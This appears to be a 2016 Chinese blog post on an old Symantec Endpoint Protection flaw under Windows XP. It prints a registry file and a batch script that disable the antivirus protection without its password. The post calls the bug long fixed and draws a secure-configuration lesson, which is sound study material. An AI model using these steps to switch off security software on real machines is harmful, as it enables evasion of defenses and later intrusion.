---
title: 旧版SEP在Windows XP下的漏洞
alias: 2016/07/31/the-bug-of-sep
dir: /
tags:
  - Windows
categories: 运维
date: 2016-07-31 14:35:44
---


低版本的 SEP(Symantec endpoint protection) 在 Windows XP 系统下存在一个漏洞（其他版本 windows 尚未验证），即修改注册表某一键的值后，即可在不输入密码的情况下关闭该软件的相关保护功能。

## 分析

首先创建一个 test.reg 文件，用于修改注册表，内容如下。<!--more-->

```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Symantec Endpoint Protection\SMC]
"smc_exit_test"=dword:00000000
```

可以看到我们只需要将位于 `HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Symantec Endpoint Protection\SMC` 中的 `smc_exit_test` 项的值改为0，就可以禁用关闭保护时的检测。

然后创建一个 bat 文件，内容如下：

```
@echo off
regedit.exe/s C:\test.reg
cd  "C:\Program Files\Symantec\Symantec Endpoint Protection"
smc -stop
```

在这个脚本中，我们通过 regedit.exe/s 命令无提示地将刚才定义的 reg 文件内容导入注册表，随后切换到 SEP 的安装目录中，通过执行 SEP 自带的 `smc -stop` 来终止保护。

运行后可以发现并没有出现在直接运行 `smc -stop` 时会弹出的要求输入密码的对话框，SEP 却直接停止了保护。

## 后记

这是 SEP 几年前旧版本中的一个漏洞，在随后的新版本中早已得到修护。我们可以从这个漏洞中看到，在编程时需要考虑一些配置信息的隐藏和权限控制问题（尤其注意早期版本 windows 的注册表），防止通过简单地修改注册表或配置文件即可停止程序主体服务的情况发生。